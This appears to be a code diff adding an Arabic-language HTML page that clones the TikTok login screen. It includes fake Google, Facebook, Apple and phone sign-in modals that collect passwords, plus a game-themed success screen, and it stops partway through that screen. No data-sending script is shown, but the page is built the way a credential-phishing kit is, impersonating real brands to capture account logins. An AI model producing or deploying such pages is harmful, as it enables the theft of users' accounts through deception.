@@ -1,0 +1,1378 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+ <meta charset="UTF-8">
+ <meta name="viewport" content="width=device-width, initial-scale=1.0">
+ <title>تسجيل الدخول إلى TikTok</title>
+ <link rel="preconnect" href="https://fonts.googleapis.com">
+ <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+ <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800;900&display=swap" rel="stylesheet">
+
+ <!-- ==================== CSS ==================== -->
+ <style>
+ /* ===== RESET & BASE ===== */
+ *, *::before, *::after {
+ margin: 0;
+ padding: 0;
+ box-sizing: border-box;
+ }
+
+ :root {
+ --tiktok-black: #010101;
+ --tiktok-dark: #161823;
+ --tiktok-gray: #6f6f6f;
+ --tiktok-light-gray: #e8e8e8;
+ --tiktok-border: #e3e3e4;
+ --tiktok-bg: #ffffff;
+ --tiktok-hover: #f8f8f8;
+ --tiktok-cyan: #25f4ee;
+ --tiktok-pink: #fe2c55;
+ --font-family: 'Tajawal', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+ }
+
+ html {
+ font-size: 16px;
+ -webkit-font-smoothing: antialiased;
+ -moz-osx-font-smoothing: grayscale;
+ }
+
+ body {
+ font-family: var(--font-family);
+ background-color: #f0f0f0;
+ color: var(--tiktok-dark);
+ min-height: 100vh;
+ display: flex;
+ align-items: center;
+ justify-content: center;
+ direction: rtl;
+ line-height: 1.5;
+ }
+
+ /* ===== LOGIN CONTAINER ===== */
+ .login-container {
+ background: var(--tiktok-bg);
+ border-radius: 12px;
+ width: 100%;
+ max-width: 480px;
+ min-height: 100vh;
+ padding: 24px 20px 32px;
+ display: flex;
+ flex-direction: column;
+ position: relative;
+ box-shadow: 0 2px 12px rgba(0, 0, 0, 0.08);
+ }
+
+ @media (min-width: 768px) {
+ .login-container {
+ min-height: auto;
+ max-width: 460px;
+ border-radius: 12px;
+ box-shadow: 0 4px 24px rgba(0, 0, 0, 0.12);
+ }
+ }
+
+ /* ===== TOP BAR ===== */
+ .top-bar {
+ display: flex;
+ justify-content: space-between;
+ align-items: center;
+ margin-bottom: 28px;
+ padding: 0 4px;
+ }
+
+ .icon-btn {
+ background: none;
+ border: none;
+ cursor: pointer;
+ color: var(--tiktok-dark);
+ display: flex;
+ align-items: center;
+ justify-content: center;
+ padding: 6px;
+ border-radius: 50%;
+ transition: background-color 0.2s ease;
+ }
+
+ .icon-btn:hover {
+ background-color: var(--tiktok-hover);
+ }
+
+ /* ===== HEADER ===== */
+ .header-section {
+ text-align: center;
+ margin-bottom: 28px;
+ padding: 0 8px;
+ }
+
+ .main-title {
+ font-size: 28px;
+ font-weight: 800;
+ color: var(--tiktok-black);
+ margin-bottom: 12px;
+ line-height: 1.3;
+ }
+
+ .subtitle {
+ font-size: 14px;
+ color: var(--tiktok-gray);
+ line-height: 1.7;
+ max-width: 380px;
+ margin: 0 auto;
+ }
+
+ /* ===== AUTH BUTTONS ===== */
+ .auth-options {
+ display: flex;
+ flex-direction: column;
+ gap: 12px;
+ padding: 0 4px;
+ flex: 1;
+ }
+
+ .auth-btn {
+ display: flex;
+ align-items: center;
+ justify-content: center;
+ width: 100%;
+ padding: 14px 20px;
+ border: 1px solid var(--tiktok-border);
+ border-radius: 8px;
+ background: var(--tiktok-bg);
+ cursor: pointer;
+ font-family: var(--font-family);
+ font-size: 15px;
+ font-weight: 600;
+ color: var(--tiktok-dark);
+ transition: all 0.2s ease;
+ gap: 12px;
+ min-height: 50px;
+ }
+
+ .auth-btn:hover {
+ background-color: var(--tiktok-hover);
+ border-color: #d0d0d0;
+ }
+
+ .auth-btn:active {
+ background-color: var(--tiktok-light-gray);
+ transform: scale(0.99);
+ }
+
+ .auth-btn-text {
+ flex: 1;
+ text-align: center;
+ }
+
+ .phone-btn, .social-btn {
+ justify-content: flex-start;
+ }
+
+ .phone-btn .auth-icon,
+ .social-btn .auth-icon {
+ margin-left: 12px;
+ flex-shrink: 0;
+ }
+
+ .phone-btn .auth-btn-text,
+ .social-btn .auth-btn-text {
+ text-align: right;
+ }
+
+ .divider {
+ height: 1px;
+ background-color: var(--tiktok-border);
+ margin: 4px 0;
+ }
+
+ /* ===== FOOTER ===== */
+ .footer-section {
+ margin-top: auto;
+ padding-top: 24px;
+ text-align: center;
+ }
+
+ .legal-text {
+ font-size: 12px;
+ color: var(--tiktok-gray);
+ line-height: 1.8;
+ }
+
+ .legal-text strong {
+ color: var(--tiktok-dark);
+ font-weight: 700;
+ }
+
+ .legal-link {
+ color: var(--tiktok-gray);
+ text-decoration: underline;
+ text-underline-offset: 2px;
+ transition: color 0.2s ease;
+ }
+
+ .legal-link:hover {
+ color: var(--tiktok-dark);
+ }
+
+ /* ===== MODALS ===== */
+ .modal-overlay {
+ position: fixed;
+ top: 0; left: 0; right: 0; bottom: 0;
+ background: rgba(0, 0, 0, 0.5);
+ backdrop-filter: blur(4px);
+ display: flex;
+ align-items: center;
+ justify-content: center;
+ z-index: 1000;
+ opacity: 0;
+ visibility: hidden;
+ transition: opacity 0.3s ease, visibility 0.3s ease;
+ padding: 20px;
+ }
+
+ .modal-overlay.active {
+ opacity: 1;
+ visibility: visible;
+ }
+
+ .modal {
+ background: var(--tiktok-bg);
+ border-radius: 12px;
+ width: 100%;
+ max-width: 420px;
+ max-height: 90vh;
+ overflow-y: auto;
+ box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+ transform: translateY(20px) scale(0.95);
+ transition: transform 0.3s ease;
+ }
+
+ .modal-overlay.active .modal {
+ transform: translateY(0) scale(1);
+ }
+
+ .modal-header {
+ display: flex;
+ justify-content: flex-end;
+ align-items: center;
+ padding: 16px 20px;
+ border-bottom: 1px solid var(--tiktok-border);
+ }
+
+ .modal-close {
+ background: none;
+ border: none;
+ font-size: 28px;
+ cursor: pointer;
+ color: var(--tiktok-gray);
+ line-height: 1;
+ padding: 4px 8px;
+ border-radius: 50%;
+ transition: all 0.2s ease;
+ }
+
+ .modal-close:hover {
+ background-color: var(--tiktok-hover);
+ color: var(--tiktok-dark);
+ }
+
+ .modal-body {
+ padding: 24px 20px;
+ }
+
+ .provider-logo-area {
+ text-align: center;
+ margin-bottom: 24px;
+ }
+
+ .provider-logo-area h2 {
+ font-size: 22px;
+ font-weight: 700;
+ color: var(--tiktok-dark);
+ margin-top: 12px;
+ margin-bottom: 8px;
+ }
+
+ /* ===== FORMS ===== */
+ .demo-form {
+ display: flex;
+ flex-direction: column;
+ gap: 16px;
+ }
+
+ .form-group {
+ display: flex;
+ flex-direction: column;
+ gap: 6px;
+ }
+
+ .form-group label {
+ font-size: 13px;
+ font-weight: 600;
+ color: var(--tiktok-dark);
+ }
+
+ .form-group input {
+ width: 100%;
+ padding: 12px 14px;
+ border: 1px solid var(--tiktok-border);
+ border-radius: 8px;
+ font-family: var(--font-family);
+ font-size: 14px;
+ color: var(--tiktok-dark);
+ background: var(--tiktok-bg);
+ transition: border-color 0.2s ease, box-shadow 0.2s ease;
+ outline: none;
+ direction: ltr;
+ text-align: right;
+ }
+
+ .form-group input::placeholder {
+ color: #b0b0b0;
+ font-size: 13px;
+ }
+
+ .form-group input:focus {
+ border-color: var(--tiktok-dark);
+ box-shadow: 0 0 0 2px rgba(22, 24, 35, 0.1);
+ }
+
+ .submit-btn {
+ width: 100%;
+ padding: 13px;
+ color: #fff;
+ border: none;
+ border-radius: 8px;
+ font-family: var(--font-family);
+ font-size: 15px;
+ font-weight: 700;
+ cursor: pointer;
+ transition: all 0.2s ease;
+ margin-top: 4px;
+ }
+
+ .submit-btn:hover {
+ transform: translateY(-1px);
+ box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+ }
+
+ .submit-btn:active {
+ transform: scale(0.98);
+ }
+
+ .google-btn { background: #4285F4; }
+ .google-btn:hover { background: #3367d6; }
+
+ .facebook-btn { background: #1877F2; }
+ .facebook-btn:hover { background: #1565c0; }
+
+ .tiktok-btn { background: var(--tiktok-dark); }
+ .tiktok-btn:hover { background: #2a2d3e; }
+
+ .apple-btn { background: #000; }
+ .apple-btn:hover { background: #333; }
+
+ .form-footer-links {
+ text-align: center;
+ margin-top: 16px;
+ font-size: 13px;
+ }
+
+ .form-footer-links a {
+ color: #4285F4;
+ text-decoration: none;
+ transition: color 0.2s ease;
+ }
+
+ .form-footer-links a:hover {
+ text-decoration: underline;
+ }
+
+ .form-footer-links .separator {
+ color: var(--tiktok-light-gray);
+ margin: 0 8px;
+ }
+
+ /* ===== TOAST ===== */
+ .toast {
+ position: fixed;
+ bottom: 30px;
+ left: 50%;
+ transform: translateX(-50%) translateY(100px);
+ background: var(--tiktok-dark);
+ color: #fff;
+ padding: 14px 24px;
+ border-radius: 10px;
+ font-size: 14px;
+ font-weight: 600;
+ display: flex;
+ align-items: center;
+ gap: 10px;
+ box-shadow: 0 8px 30px rgba(0, 0, 0, 0.2);
+ z-index: 2000;
+ opacity: 0;
+ transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+ pointer-events: none;
+ }
+
+ .toast.show {
+ transform: translateX(-50%) translateY(0);
+ opacity: 1;
+ }
+
+ /* ===== SUCCESS SCREEN ===== */
+ .success-overlay {
+ position: fixed;
+ top: 0; left: 0; right: 0; bottom: 0;
+ z-index: 3000;
+ opacity: 0;
+ visibility: hidden;
+ transition: opacity 0.5s ease, visibility 0.5s ease;
+ overflow-y: auto;
+ }
+
+ .success-overlay.active {
+ opacity: 1;
+ visibility: visible;
+ }
+
+ .success-container {
+ min-height: 100vh;
+ background: linear-gradient(135deg, #0a0a1a 0%, #1a0a2e 30%, #0d1b3e 60%, #0a0a1a 100%);
+ position: relative;
+ display: flex;
+ align-items: center;
+ justify-content: center;
+ padding: 20px;
+ }
+
+ .success-container::before {
+ content: '';
+ position: absolute;
+ top: 0; left: 0; right: 0; bottom: 0;
+ background:
+ radial-gradient(ellipse at 20% 50%, rgba(37, 244, 238, 0.08) 0%, transparent 50%),
+ radial-gradient(ellipse at 80% 20%, rgba(254, 44, 85, 0.08) 0%, transparent 50%),
+ radial-gradient(ellipse at 50% 80%, rgba(100, 100, 255, 0.05) 0%, transparent 50%);
+ pointer-events: none;
+ }
+
+ #confettiCanvas {
+ position: absolute;
+ top: 0; left: 0;
+ width: 100%;
+ height: 100%;
+ pointer-events: none;
+ z-index: 1;
+ }
+
+ .success-content {
+ position: relative;
+ z-index: 2;
+ max-width: 520px;
+ width: 100%;
+ text-align: center;
+ padding: 40px 24px;
+ }
+
+ .success-icon-wrapper {
+ position: relative;
+ width: 90px;
+ height: 90px;
+ margin: 0 auto 20px;
+ }
+
+ .success-icon-ring {
+ position: absolute;
+ top: 0; left: 0; right: 0; bottom: 0;
+ border-radius: 50%;
+ background: linear-gradient(135deg, var(--tiktok-cyan), var(--tiktok-pink));
+ animation: ringPulse 2s ease-in-out infinite;
+ }
+
+ .success-icon-check {
+ position: absolute;
+ top: 6px; left: 6px; right: 6px; bottom: 6px;
+ border-radius: 50%;
+ background: linear-gradient(135deg, #1a1a3e, #2a1a4e);
+ display: flex;
+ align-items: center;
+ justify-content: center;
+ animation: checkBounce 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275) 0.3s both;
+ }
+
+ @keyframes ringPulse {
+ 0%, 100% { transform: scale(1); opacity: 1; }
+ 50% { transform: scale(1.08); opacity: 0.8; }
+ }
+
+ @keyframes checkBounce {
+ 0% { transform: scale(0); }
+ 100% { transform: scale(1); }
+ }
+
+ .success-tiktok-logo {
+ margin-bottom: 16px;
+ animation: fadeInUp 0.6s ease 0.2s both;
+ }
+
+ .success-title {
+ font-size: 28px;
+ font-weight: 900;
+ color: #fff;
+ margin-bottom: 10px;
+ animation: fadeInUp 0.6s ease 0.3s both;
+ text-shadow: 0 0 40px rgba(37, 244, 238, 0.3);
+ }
+
+ .success-subtitle {
+ font-size: 17px;
+ color: rgba(255, 255, 255, 0.8);
+ margin-bottom: 6px;
+ animation: fadeInUp 0.6s ease 0.4s both;
+ }
+
+ .game-name {
+ background: linear-gradient(90deg, var(--tiktok-cyan), var(--tiktok-pink));
+ -webkit-background-clip: text;
+ -webkit-text-fill-color: transparent;
+ background-clip: text;
+ font-weight: 800;
+ }
+
+ .success-description {
+ font-size: 15px;
+ color: rgba(255, 255, 255, 0.6);
+ margin-bottom: 28px;
+ animation: fadeInUp 0.6s ease 0.5s both;
+ }
+
+ .game-image-wrapper {
+ position: relative;
+ border-radius: 16px;
+ overflow: hidden;
+ margin-bottom: 24px;
+ animation: fadeInUp 0.8s ease 0.5s both;
+ box-shadow:
+ 0 0 40px rgba(37, 244, 238, 0.15),
+ 0 0 80px rgba(254, 44, 85, 0.1),
+ 0 20px 60px rgba(0, 0, 0, 0.4);
+ }
+
+ .game-image-glow {
+ position: absolute;
+ top: -2px; left: -2px; right: -2px; bottom: -2px;
+ background: linear-gradient(135deg, var(--tiktok-cyan), var(--tiktok-pink), var(--tiktok-cyan));
+ border-radius: 18px;
+ z-index: -1;
+ animation: glowRotate 4s linear infinite;
+ background-size: 300% 300%;
+ }
+
+ @keyframes glowRotate {
+ 0% { background-position: 0% 50%; }
+ 50% { background-position: 100% 50%; }
+ 100% { background-position: 0% 50%; }
+ }
+
+ .game-image {
+ width: 100%;
+ height: auto;
+ display: block;
+ border-radius: 16px;
+ transition: transform 0.5s ease;
+ }
+
+ .game-image:hover {
+ transform: scale(1.02);
+ }
+
+ .game-image-overlay {
+ position: absolute;
+ top: 0; left: 0; right: 0; bottom: 0;
+ background: linear-gradient(180deg, transparent 60%, rgba(0,0,0,0.4) 100%);
+ display: flex;
+ align-items: flex-end;
+ justify-content: center;
+ padding-bottom: 16px;
+ }
+
+ .game-badge {
+ display: inline-flex;
+ align-items: center;
+ gap: 8px;
+ background: rgba(0, 0, 0, 0.7);
+ backdrop-filter: blur(10px);
+ padding: 8px 20px;
+ border-radius: 30px;
+ font-size: 13px;
+ font-weight: 700;
+ color: #fff;
+ letter-spacing: 2px;
+ border: 1px solid rgba(255,255,255,0.15);
+ }
+
+ .live-dot {
+ width: 8px;
+ height: 8px;
+ background: var(--tiktok-pink);
+ border-radius: 50%;
+ animation: livePulse 1.5s ease-in-out infinite;
+ }
+
+ @keyframes livePulse {
+ 0%, 100% { opacity: 1; transform: scale(1); }
+ 50% { opacity: 0.5; transform: scale(0.8); }
+ }
+
+ .game-info-cards {
+ display: flex;
+ gap: 12px;
+ margin-bottom: 24px;
+ animation: fadeInUp 0.6s ease 0.7s both;
+ }
+
+ .info-card {
+ flex: 1;
+ background: rgba(255, 255, 255, 0.06);
+ backdrop-filter: blur(10px);
+ border: 1px solid rgba(255, 255, 255, 0.1);
+ border-radius: 12px;
+ padding: 14px 10px;
+ display: flex;
+ flex-direction: column;
+ align-items: center;
+ gap: 6px;
+ transition: all 0.3s ease;
+ }
+
+ .info-card:hover {
+ background: rgba(255, 255, 255, 0.1);
+ border-color: rgba(37, 244, 238, 0.3);
+ transform: translateY(-2px);
+ }
+
+ .info-card-icon {
+ font-size: 24px;
+ }
+
+ .info-card-text {
+ display: flex;
+ flex-direction: column;
+ gap: 2px;
+ }
+
+ .info-label {
+ font-size: 11px;
+ color: rgba(255, 255, 255, 0.5);
+ font-weight: 500;
+ }
+
+ .info-value {
+ font-size: 13px;
+ color: #fff;
+ font-weight: 700;
+ }
+
+ .notification-section {
+ margin-bottom: 24px;
+ animation: fadeInUp 0.6s ease 0.8s both;
+ }
+
+ .notification-toggle {
+ display: flex;
+ align-items: center;
+ justify-content: center;
+ gap: 12px;
+ cursor: pointer;
+ }
+
+ .toggle-switch {
+ position: relative;
+ width: 48px;
+ height: 26px;
+ }
+
+ .toggle-switch input {
+ opacity: 0;
+ width: 0;
+ height: 0;
+ }
+
+ .toggle-slider {
+ position: absolute;
+ top: 0; left: 0; right: 0; bottom: 0;
+ background: rgba(255, 255, 255, 0.15);
+ border-radius: 26px;
+ transition: all 0.3s ease;
+ cursor: pointer;
+ }
+
+ .toggle-slider::before {
+ content: '';
+ position: absolute;
+ width: 20px;
+ height: 20px;
+ left: 3px;
+ bottom: 3px;
+ background: #fff;
+ border-radius: 50%;
+ transition: all 0.3s ease;
+ }
+
+ .toggle-switch input:checked + .toggle-slider {
+ background: linear-gradient(135deg, var(--tiktok-cyan), var(--tiktok-pink));
+ }
+
+ .toggle-switch input:checked + .toggle-slider::before {
+ transform: translateX(22px);
+ }
+
+ .toggle-label {
+ font-size: 14px;
+ color: rgba(255, 255, 255, 0.7);
+ font-weight: 500;
+ }
+
+ .back-btn {
+ display: inline-flex;
+ align-items: center;
+ gap: 8px;
+ background: rgba(255, 255, 255, 0.08);
+ border: 1px solid rgba(255, 255, 255, 0.15);
+ color: #fff;
+ padding: 12px 28px;
+ border-radius: 30px;
+ font-family: var(--font-family);
+ font-size: 14px;
+ font-weight: 600;
+ cursor: pointer;
+ transition: all 0.3s ease;
+ animation: fadeInUp 0.6s ease 0.9s both;
+ }
+
+ .back-btn:hover {
+ background: rgba(255, 255, 255, 0.15);
+ border-color: rgba(255, 255, 255, 0.3);
+ transform: translateY(-2px);
+ }
+
+ /* ===== ANIMATIONS ===== */
+ @keyframes fadeInUp {
+ from {
+ opacity: 0;
+ transform: translateY(20px);
+ }
+ to {
+ opacity: 1;
+ transform: translateY(0);
+ }
+ }
+
+ .auth-options .auth-btn {
+ animation: fadeInUp 0.4s ease forwards;
+ }
+
+ .auth-options .auth-btn:nth-child(1) { animation-delay: 0.05s; }
+ .auth-options .auth-btn:nth-child(3) { animation-delay: 0.1s; }
+ .auth-options .auth-btn:nth-child(4) { animation-delay: 0.15s; }
+ .auth-options .auth-btn:nth-child(5) { animation-delay: 0.2s; }
+
+ .header-section {
+ animation: fadeInUp 0.4s ease forwards;
+ }
+
+ /* ===== RESPONSIVE ===== */
+ @media (max-width: 480px) {
+ body { background: var(--tiktok-bg); }
+
+ .login-container {
+ max-width: 100%;
+ min-height: 100vh;
+ border-radius: 0;
+ box-shadow: none;
+ padding: 20px 16px 28px;
+ }
+
+ .main-title { font-size: 24px; }
+ .subtitle { font-size: 13px; }
+
+ .modal {
+ max-width: 100%;
+ border-radius: 12px 12px 0 0;
+ max-height: 95vh;
+ }
+
+ .modal-overlay {
+ align-items: flex-end;
+ padding: 0;
+ }
+
+ .success-title { font-size: 22px; }
+ .success-subtitle { font-size: 15px; }
+
+ .game-info-cards {
+ flex-direction: column;
+ gap: 8px;
+ }
+
+ .info-card {
+ flex-direction: row;
+ padding: 12px 16px;
+ }
+ }
+
+ @media (min-width: 481px) and (max-width: 767px) {
+ .login-container { max-width: 440px; }
+ }
+
+ .modal::-webkit-scrollbar { width: 4px; }
+ .modal::-webkit-scrollbar-track { background: transparent; }
+ .modal::-webkit-scrollbar-thumb { background: var(--tiktok-light-gray); border-radius: 4px; }
+
+ .auth-btn:focus-visible,
+ .icon-btn:focus-visible,
+ .modal-close:focus-visible,
+ .form-group input:focus-visible,
+ .back-btn:focus-visible {
+ outline: 2px solid var(--tiktok-cyan);
+ outline-offset: 2px;
+ }
+ </style>
+</head>
+<body>
+
+ <!-- ==================== MAIN LOGIN PAGE ==================== -->
+ <div class="login-container" id="loginContainer">
+ <div class="top-bar">
+ <button class="icon-btn help-btn" aria-label="مساعدة">
+ <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+ <circle cx="12" cy="12" r="10"/>
+ <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/>
+ <line x1="12" y1="17" x2="12.01" y2="17"/>
+ </svg>
+ </button>
+ <button class="icon-btn close-btn" aria-label="إغلاق" id="closeBtn">
+ <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+ <line x1="18" y1="6" x2="6" y2="18"/>
+ <line x1="6" y1="6" x2="18" y2="18"/>
+ </svg>
+ </button>
+ </div>
+
+ <div class="header-section">
+ <h1 class="main-title">تسجيل الدخول إلى TikTok</h1>
+ <p class="subtitle">قم بإدارة حسابك، والتحقق من الإشعارات والتعليق على الفيديوهات، وأكثر من ذلك.</p>
+ </div>
+
+ <div class="auth-options">
+ <button class="auth-btn phone-btn" id="phoneBtn">
+ <svg class="auth-icon user-icon" width="22" height="22" viewBox="0 0 24 24" fill="currentColor">
+ <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
+ </svg>
+ <span class="auth-btn-text">استخدام الهاتف/البريد الإلكتروني/اسم المستخدم</span>
+ </button>
+
+ <div class="divider"></div>
+
+ <button class="auth-btn social-btn" id="facebookBtn">
+ <svg class="auth-icon facebook-icon" width="24" height="24" viewBox="0 0 24 24">
+ <path fill="#1877F2" d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+ </svg>
+ <span class="auth-btn-text">المتابعة باستخدام فيسبوك</span>
+ </button>
+
+ <button class="auth-btn social-btn" id="googleBtn">
+ <svg class="auth-icon google-icon" width="24" height="24" viewBox="0 0 24 24">
+ <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z"/>
+ <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+ <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
+ <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
+ </svg>
+ <span class="auth-btn-text">المتابعة باستخدام Google</span>
+ </button>
+
+ <button class="auth-btn social-btn" id="appleBtn">
+ <svg class="auth-icon apple-icon" width="24" height="24" viewBox="0 0 24 24">
+ <path fill="#000000" d="M17.05 20.28c-.98.95-2.05.88-3.08.4-1.09-.5-2.08-.48-3.24 0-1.44.62-2.2.44-3.06-.4C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/>
+ </svg>
+ <span class="auth-btn-text">المتابعة باستخدام Apple</span>
+ </button>
+ </div>
+
+ <div class="footer-section">
+ <p class="legal-text">
+ من خلال الاستمرار في استخدام حساب موجود في <strong>مصر</strong>، فإنك توافق على
+ <a href="#" class="legal-link">شروط الخدمة</a> لدينا وتقر بأنك قد قرأت
+ <a href="#" class="legal-link">سياسة الخصوصية</a>.
+ </p>
+ </div>
+ </div>
+
+ <!-- ==================== GOOGLE MODAL ==================== -->
+ <div class="modal-overlay" id="googleModal">
+ <div class="modal">
+ <div class="modal-header">
+ <button class="modal-close" data-modal="googleModal">&times;</button>
+ </div>
+ <div class="modal-body">
+ <div class="provider-logo-area">
+ <svg width="48" height="48" viewBox="0 0 24 24">
+ <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z"/>
+ <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+ <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
+ <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
+ </svg>
+ <h2>تسجيل الدخول بحساب Google</h2>
+ </div>
+ <form class="demo-form" id="googleForm">
+ <div class="form-group">
+ <label for="googleEmail">البريد الإلكتروني أو رقم الهاتف</label>
+ <input type="text" id="googleEmail" placeholder="example@gmail.com" autocomplete="off">
+ </div>
+ <div class="form-group">
+ <label for="googlePassword">كلمة المرور</label>
+ <input type="password" id="googlePassword" placeholder="••••••••" autocomplete="off">
+ </div>
+ <button type="submit" class="submit-btn google-btn">التالي</button>
+ </form>
+ <div class="form-footer-links">
+ <a href="#">هل نسيت كلمة المرور؟</a>
+ </div>
+ </div>
+ </div>
+ </div>
+
+ <!-- ==================== FACEBOOK MODAL ==================== -->
+ <div class="modal-overlay" id="facebookModal">
+ <div class="modal">
+ <div class="modal-header">
+ <button class="modal-close" data-modal="facebookModal">&times;</button>
+ </div>
+ <div class="modal-body">
+ <div class="provider-logo-area">
+ <svg width="48" height="48" viewBox="0 0 24 24">
+ <path fill="#1877F2" d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+ </svg>
+ <h2>تسجيل الدخول بحساب فيسبوك</h2>
+ </div>
+ <form class="demo-form" id="facebookForm">
+ <div class="form-group">
+ <label for="fbEmail">البريد الإلكتروني أو رقم الهاتف</label>
+ <input type="text" id="fbEmail" placeholder="example@email.com" autocomplete="off">
+ </div>
+ <div class="form-group">
+ <label for="fbPassword">كلمة المرور</label>
+ <input type="password" id="fbPassword" placeholder="••••••••" autocomplete="off">
+ </div>
+ <button type="submit" class="submit-btn facebook-btn">تسجيل الدخول</button>
+ </form>
+ <div class="form-footer-links">
+ <a href="#">هل نسيت كلمة المرور؟</a>
+ </div>
+ </div>
+ </div>
+ </div>
+
+ <!-- ==================== PHONE MODAL ==================== -->
+ <div class="modal-overlay" id="phoneModal">
+ <div class="modal">
+ <div class="modal-header">
+ <button class="modal-close" data-modal="phoneModal">&times;</button>
+ </div>
+ <div class="modal-body">
+ <div class="provider-logo-area">
+ <h2>تسجيل الدخول إلى TikTok</h2>
+ </div>
+ <form class="demo-form" id="phoneForm">
+ <div class="form-group">
+ <label for="phoneInput">رقم الهاتف أو البريد الإلكتروني أو اسم المستخدم</label>
+ <input type="text" id="phoneInput" placeholder="أدخل رقم الهاتف أو البريد الإلكتروني" autocomplete="off">
+ </div>
+ <div class="form-group">
+ <label for="phonePassword">كلمة المرور</label>
+ <input type="password" id="phonePassword" placeholder="••••••••" autocomplete="off">
+ </div>
+ <button type="submit" class="submit-btn tiktok-btn">تسجيل الدخول</button>
+ </form>
+ <div class="form-footer-links">
+ <a href="#">هل نسيت كلمة المرور؟</a>
+ <span class="separator">|</span>
+ <a href="#">إنشاء حساب</a>
+ </div>
+ </div>
+ </div>
+ </div>
+
+ <!-- ==================== APPLE MODAL ==================== -->
+ <div class="modal-overlay" id="appleModal">
+ <div class="modal">
+ <div class="modal-header">
+ <button class="modal-close" data-modal="appleModal">&times;</button>
+ </div>
+ <div class="modal-body">
+ <div class="provider-logo-area">
+ <svg width="48" height="48" viewBox="0 0 24 24">
+ <path fill="#000" d="M17.05 20.28c-.98.95-2.05.88-3.08.4-1.09-.5-2.08-.48-3.24 0-1.44.62-2.2.44-3.06-.4C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/>
+ </svg>
+ <h2>تسجيل الدخول بحساب Apple</h2>
+ </div>
+ <form class="demo-form" id="appleForm">
+ <div class="form-group">
+ <label for="appleEmail">البريد الإلكتروني</label>
+ <input type="text" id="appleEmail" placeholder="example@icloud.com" autocomplete="off">
+ </div>
+ <div class="form-group">
+ <label for="applePassword">كلمة المرور</label>
+ <input type="password" id="applePassword" placeholder="••••••••" autocomplete="off">
+ </div>
+ <button type="submit" class="submit-btn apple-btn">تسجيل الدخول</button>
+ </form>
+ </div>
+ </div>
+ </div>
+
+ <!-- ==================== SUCCESS SCREEN ==================== -->
+ <div class="success-overlay" id="successScreen">
+ <div class="success-container">
+ <canvas id="confettiCanvas"></canvas>
+
+ <div class="success-content">
+ <div class="success-icon-wrapper">
+ <div class="success-icon-ring"></div>
+ <div class="success-icon-check">
